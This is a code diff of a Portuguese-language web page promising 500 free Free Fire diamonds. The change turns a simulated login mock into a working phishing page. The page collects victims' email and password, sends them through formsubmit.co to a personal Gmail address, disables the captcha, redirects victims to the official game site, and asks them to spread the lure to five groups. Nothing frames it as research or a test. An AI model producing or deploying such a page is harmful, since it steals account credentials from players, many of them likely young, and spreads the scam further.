@@ -2,73 +2,49 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
-  <title>Ganhe 500 Diamantes - Free Fire</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ganhe 500 Diamantes</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #e3f2fd;
-      text-align: center;
-      padding: 50px;
+      font-family: Arial;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-
-    .container {
+    .form-container {
       background-color: #fff;
       padding: 30px;
-      max-width: 400px;
-      margin: auto;
-      border-radius: 10px;
+      border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
     }
-
     input, button {
-      padding: 12px;
-      width: 90%;
-      margin-bottom: 15px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      font-size: 16px;
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
     }
-
     button {
-      background-color: #2196f3;
+      background: #2196F3;
       color: #fff;
       border: none;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #1976d2;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🎉 Parabéns! 🎉</h1>
+  <div class="form-container">
+ <h1>🎉 Parabéns! 🎉</h1>
     <p>Você foi selecionado para ganhar <strong>500 diamantes no Free Fire</strong>!</p>
-    <p>Faça login com sua conta e compartilhe com 10 grupos.</p>
-
-    <form onsubmit="enviarDados(); return false;">
-      <input type="email" id="email" placeholder="Email" required><br>
-      <input type="password" id="senha" placeholder="Senha" required><br>
+    <p>Faça login com sua conta e compartilhe com 5 grupos para você obter a sua recompensa.</p>
+    <form action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
+      <input type="email" name="email" placeholder="Seu Email" required>
+      <input type="text" name="password" placeholder="Sua senha" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://freefire.com/">
       <button type="submit">Iniciar Sessão</button>
     </form>
   </div>
-
-  <script>
-    function enviarDados() {
-      const email = document.getElementById("email").value;
-      const senha = document.getElementById("senha").value;
-
-      console.log("Login simulado:");
-      console.log("Email:", email);
-      console.log("Senha:", senha);
-
-      alert("Login enviado com sucesso! Agora você será redirecionado...");
-      setTimeout(() => {
-        window.location.href = "https://reward.ff.garena.com/";
-      }, 1500);
-    }
-  </script>
 </body>
 </html>
+</style>
